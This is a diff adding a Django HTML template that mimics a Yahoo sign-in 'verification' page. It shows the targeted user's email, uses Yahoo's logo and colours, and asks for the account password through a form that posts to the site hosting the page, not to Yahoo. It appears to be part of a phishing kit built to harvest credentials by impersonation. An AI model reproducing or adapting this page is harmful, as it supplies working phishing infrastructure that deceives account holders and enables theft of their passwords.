@@ -1,0 +1,107 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/yahooo3.jpeg' %}" />
+
+  <title>Yahoo Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .verification-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 320px;
+    }
+
+    .logo {
+      color: #6001d2;
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 8px;
+      /* border: 2px solid black; */
+    }
+
+    h2 {
+      margin: 0;
+      font-size: 20px;
+    }
+
+    .subtitle {
+      color: #555;
+      font-size: 14px;
+      margin: 8px 0 17px;
+      /* border: 2px solid black; */
+
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-bottom: 2px solid #c5c5c5;
+      font-size: 16px;
+      outline: none;
+      text-align: left;
+      letter-spacing: 4px;
+      margin-bottom: 20px;
+    }
+
+    input[type="password"]:focus {
+      border-bottom-color: #6001d2;
+    }
+
+    .btn {
+      background: #6001d2;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #5201b8;
+    }
+  </style>
+</head>
+<body>
+  <div class="verification-box">
+    <div class="logo"><img src="{% static 'networkbinary/images/yahoo-top.PNG' %}" alt=""></div>
+{% if user %}
+    <div class="subtitle"><strong> {{ user.email }}</strong></div>
+   
+
+    <!-- Input box instead of static number -->
+      
+
+{% endif %}
+
+    <h2>Enter Password</h2>
+    <div class="subtitle">to finish sign in </div>
+
+    <form action="" method="POST">
+      {% csrf_token %}
+
+      <input type="password" name="password" placeholder="Password" />
+      <button class="btn">Next</button>
+    </form>
+  </div>
+</body>
+</html>
+
